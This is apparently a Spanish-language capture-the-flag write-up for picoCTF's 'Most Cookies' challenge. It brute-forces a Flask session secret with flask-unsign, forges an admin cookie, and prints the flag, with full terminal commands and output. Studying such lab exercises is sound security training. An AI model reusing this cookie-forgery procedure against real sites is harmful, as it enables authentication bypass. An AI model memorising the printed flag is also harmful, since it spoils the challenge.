### Descripción
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/cae5577e6b8f86e17d7884723204f61e/server.py) [http://mercury.picoctf.net:6259/](http://mercury.picoctf.net:6259/)

Hints:
1. How secure is a flask cookie?

### Solución
Se descarga el archivo:

```
┌──(kali㉿kali)-[~/picoCTF/web4/mostcookies]
└─$ wget 'https://mercury.picoctf.net/static/cae5577e6b8f86e17d7884723204f61e/server.py'                                                                        
--2025-04-01 21:12:01--  https://mercury.picoctf.net/static/cae5577e6b8f86e17d7884723204f61e/server.py
Resolving mercury.picoctf.net (mercury.picoctf.net)... 18.189.209.142
Connecting to mercury.picoctf.net (mercury.picoctf.net)|18.189.209.142|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2021 (2.0K) [application/octet-stream]
Saving to: ‘server.py’

server.py             100%[======================>]   1.97K  --.-KB/s    in 0s      

2025-04-01 21:12:01 (63.7 MB/s) - ‘server.py’ saved [2021/2021]

                                                                                     
┌──(kali㉿kali)-[~/picoCTF/web4/mostcookies]
└─$ echo eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-yO-w.UjcS6nvpzo2_J3fxYKLy97txBDY
eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-yO-w.UjcS6nvpzo2_J3fxYKLy97txBDY
                                                                                     
┌──(kali㉿kali)-[~/picoCTF/web4/mostcookies]
└─$ echo eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-yO-w.UjcS6nvpzo2_J3fxYKLy97txBDY | base64 -d
{"very_auth":"snickerdoodle"}base64: invalid input
                                                                                     
┌──(kali㉿kali)-[~/picoCTF/web4/mostcookies]
└─$ ls                  
server.py
```


Decodificamos la cookie.
Creamos un nuevo archivo con todas las cookies donde se debe reemplazar  "," por un salto de linea \n y guardamos el archivo.
```
┌──(kali㉿kali)-[~/picoCTF/web4/mostcookies]
└─$ cat server.py       
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(_name_)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

┌──(kali㉿kali)-[~/picoCTF/web4/mostcookies]
└─$ cat cookies.txt 
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia

```

Instalamos flask-unsign creando una carpeta y activando un ambiente virtual para instalar la herramienta.
Y cuando se descarga ahora si se puede descargar la herramienta sin tener problema con las referencias del sistema:
```
┌──(kali㉿kali)-[~/picoCTF/web4/mostcookies]
└─$ sudo apt install python3-venv        
python3-venv is already the newest version (3.12.6-1).
python3-venv set to manually installed.
Summary:
  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 0
                                                                                     
┌──(kali㉿kali)-[~/picoCTF/web4/mostcookies]
└─$ python3 -m venv ~/.venv  
                                                                                     
┌──(kali㉿kali)-[~/picoCTF/web4/mostcookies]
└─$ source ~/.venv/bin/activate
                                                                                     
┌──(.venv)─(kali㉿kali)-[~/picoCTF/web4/mostcookies]
└─$ python3 -m pip install flask-unsign
Successfully installed Jinja2-3.1.6 blinker-1.9.0 certifi-2025.1.31 charset-normalizer-3.4.1 click-8.1.8 flask-3.1.0 flask-unsign-1.2.1 idna-3.10 itsdangerous-2.2.0 markupsafe-3.0.2 requests-2.32.3 urllib3-2.3.0 werkzeug-3.1.3
```


Tomar la cookie y realizar el ataque de fuerza bruta. Observamos la palabra con la que se firmo la cookie 'gingersnap':
```
┌──(.venv)─(kali㉿kali)-[~/picoCTF/web4/mostcookies]
└─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-yO-w.UjcS6nvpzo2_J3fxYKLy97txBDY" --wordlist cookies.txt
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'gingersnap'
                                                                                     
┌──(.venv)─(kali㉿kali)-[~/picoCTF/web4/mostcookies]
└─$ flask-unsign --sign --cookie "{'very_auth':'admin'}" --secret "gingersnap"   
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-yTlQ.XZbRz5UMY6XI09VD1XPCtcC84qc
                                                                                     
┌──(.venv)─(kali㉿kali)-[~/picoCTF/web4/mostcookies]
└─$ curl -s http://mercury.picoctf.net:6259/display -H "Cookie: session=http://mercury.picoctf.net:6259/display"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/">/</a>.  If not click the link.                                                                                     
┌──(.venv)─(kali㉿kali)-[~/picoCTF/web4/mostcookies]
└─$ curl -s http://mercury.picoctf.net:6259/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-yTlQ.XZbRz5UMY6XI09VD1XPCtcC84qc" | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_5f016958}</code></p>
                                                                                     
┌──(.venv)─(kali㉿kali)-[~/picoCTF/web4/mostcookies]
└─$ curl -s http://mercury.picoctf.net:6259/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-yTlQ.XZbRz5UMY6XI09VD1XPCtcC84qc" | grep -oE "picoCTF{.*?}"
picoCTF{pwn_4ll_th3_cook1E5_5f016958}
```

Flag:
picoCTF{pwn_4ll_th3_cook1E5_5f016958}

### Notas adicionales
Flask-unsign es una herramienta que nos permite realizar un ataque de fuerza bruta a la cookie para saber con cual llave fue cifrada.

### Referencias
Flask-unsign
